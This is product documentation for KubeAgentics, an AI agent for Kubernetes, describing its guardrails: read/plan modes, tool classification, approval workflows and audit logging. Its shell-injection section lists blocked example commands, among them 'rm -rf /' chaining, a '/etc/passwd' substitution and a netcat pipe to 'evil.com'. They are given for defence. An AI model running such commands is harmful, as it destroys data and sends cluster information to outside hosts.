---
sidebar_position: 1
title: Guardrails Overview
description: Safety mechanisms for AI-powered Kubernetes operations
---

# Guardrails Overview

KubeAgentics implements multiple layers of guardrails to ensure safe AI-powered operations on your Kubernetes clusters. These safety mechanisms prevent accidental changes and provide visibility into what the AI can and cannot do.

## Defense in Depth

Our guardrails follow a defense-in-depth strategy with multiple layers:

```
┌─────────────────────────────────────────────────────┐
│                    User Interface                    │
│         (Mode selection, approval workflows)         │
├─────────────────────────────────────────────────────┤
│                   Mode Enforcement                   │
│          (Ask mode vs Plan mode filtering)          │
├─────────────────────────────────────────────────────┤
│               Command-Level Safety                   │
│      (Per-command read/write/dangerous for CLI)     │
├─────────────────────────────────────────────────────┤
│                 Tool Classification                  │
│        (read / write / dangerous categories)         │
├─────────────────────────────────────────────────────┤
│               Shell Injection Prevention             │
│          (Blocks metacharacters in CLI args)         │
├─────────────────────────────────────────────────────┤
│                  Execution Engine                    │
│        (Plan & Approve, step-by-step execution)     │
├─────────────────────────────────────────────────────┤
│                  Kubernetes RBAC                     │
│           (Cluster-level permissions)                │
└─────────────────────────────────────────────────────┘
```

## Key Guardrail Components

### 1. Mode-Based Access Control

The Agentic Panel operates in two modes with different capabilities:

| Mode | Read Operations | Write Operations | Use Case |
|------|-----------------|------------------|----------|
| **Ask** | ✅ Allowed | ❌ Blocked | Exploration, debugging |
| **Plan** | ✅ Allowed | ✅ With approval | Making changes |

See [Ask Mode](../features/ask-mode.md) and [Plan Mode](../features/plan-mode.md) for details.

### 2. Tool Classification System

Every tool (built-in and MCP) is classified into one of three categories:

| Classification | Color | Ask Mode | Plan Mode | Examples |
|----------------|-------|----------|-----------|----------|
| **Read** | Green | ✅ Allowed | ✅ Allowed | get, describe, logs |
| **Write** | Yellow | ❌ Blocked | ✅ With plan | create, scale, update |
| **Dangerous** | Red | ❌ Blocked | ⚠️ Extra approval | delete, drain |

See [Tool Classification](./tool-classification.md) for details.

### 3. Command-Level Safety (CLI Tools)

For local CLI tools (Docker, Helm, Terraform, etc.), safety is classified at the **command level**, not the tool level:

| Tool | Command | Classification | Behavior |
|------|---------|----------------|----------|
| docker | `ps` | Read | Auto-execute |
| docker | `build` | Write | Plan & Approve |
| docker | `rm` | Dangerous | Extra confirmation |
| kubectl | `get` | Read | Auto-execute |
| kubectl | `apply` | Write | Plan & Approve |
| kubectl | `delete` | Dangerous | Extra confirmation |

This granular approach means `docker ps` runs freely while `docker rm` requires explicit approval - even though they're the same tool.

See [Command-Level Safety](./command-safety.md) for details.

### 4. Shell Injection Prevention

All CLI tool execution includes protection against shell injection attacks:

```bash
# Blocked patterns
kubectl get pods; rm -rf /     # Command chaining
docker run $(cat /etc/passwd)  # Command substitution
helm list | nc evil.com 1234   # Pipe to external
```

Blocked characters: `;` `|` `&` `$` `` ` `` `>` `<`

### 5. Plan & Approve Workflow

All write operations in Plan mode go through a structured workflow:

1. **Planning**: AI generates execution plan
2. **Review**: User reviews steps and risks
3. **Approval**: User explicitly approves
4. **Execution**: Steps run with monitoring
5. **Verification**: Results confirmed

### 4. Risk Assessment

Each planned step is assessed for risk:

- **Low Risk** (green): Safe, easily reversible
- **Medium Risk** (yellow): May cause brief disruption
- **High Risk** (red): Potentially destructive, requires confirmation

## Configuration Options

### Disable Plan Mode

For GitOps-only environments:

```typescript
// In workspace settings
setPlanModeEnabled(false);
```

This hides the Plan tab entirely, restricting users to read-only operations.

### Tool Classification Overrides

Administrators can override auto-classification:

1. Go to **Settings > Tool Access**
2. Find the tool to modify
3. Click Edit and select new classification
4. Changes are persisted across sessions

## MCP Server Safety

When users add new MCP servers, tools are handled safely:

| Scenario | Classification | Ask Mode |
|----------|----------------|----------|
| Tool named `get_*`, `list_*`, `describe_*` | Auto → Read | ✅ Allowed |
| Tool named `create_*`, `update_*`, `scale_*` | Auto → Write | ❌ Blocked |
| Tool named `delete_*`, `destroy_*`, `drain_*` | Auto → Dangerous | ❌ Blocked |
| Unknown tool name | Default → Write | ❌ Blocked |

The **fail-safe default** ensures unknown tools are blocked until explicitly classified as read-only.

## Visibility & Transparency

### Blocked Tools Warning

In Ask mode, users see blocked tool counts:

```
⚠️ 12 tools blocked in Ask mode (8 write, 4 dangerous)
```

### Tool Access Settings

The Tool Access settings page shows:

- All available tools with classifications
- Which tools are overridden vs auto-classified
- Filter and search capabilities
- One-click classification changes

### AI Activity Log

All AI operations are logged:

- Tool calls with parameters
- Execution results
- Errors and warnings
- Timing information

## Best Practices

### For Operators

1. **Start in Ask mode** - Gather information before making changes
2. **Review plans carefully** - Understand each step before approving
3. **Use Quick Dx** - Let AI diagnose before you fix
4. **Check risk levels** - Pay attention to yellow/red warnings

### For Administrators

1. **Review MCP tools** - Classify new tools appropriately
2. **Consider GitOps** - Disable Plan mode if changes should go through pipelines
3. **Audit activity logs** - Monitor AI operations
4. **Set up RBAC** - Ensure proper Kubernetes permissions

## Compliance Considerations

### Audit Trail

All AI operations are logged with:
- Timestamp
- User session
- Tool name and parameters
- Execution result
- Error messages (if any)

### Change Control

Plan mode provides built-in change control:
- Explicit approval required
- Step-by-step visibility
- Rollback information
- Execution summary

### Access Control

Multiple layers of access control:
- Mode-based restrictions (Ask vs Plan)
- Tool classification enforcement
- Kubernetes RBAC integration
- Session-based permissions

## Related Documentation

- [Ask Mode](../features/ask-mode.md) - Read-only exploration
- [Plan & Approve Mode](../features/plan-mode.md) - Safe change execution
- [Tool Classification](./tool-classification.md) - Managing tool access
- [Command-Level Safety](./command-safety.md) - Per-command classification for CLI tools
- [Local CLI Tools](../features/local-cli-tools.md) - Desktop CLI tool integration
- [MCP Servers](../integrations/overview.md) - External tool integration
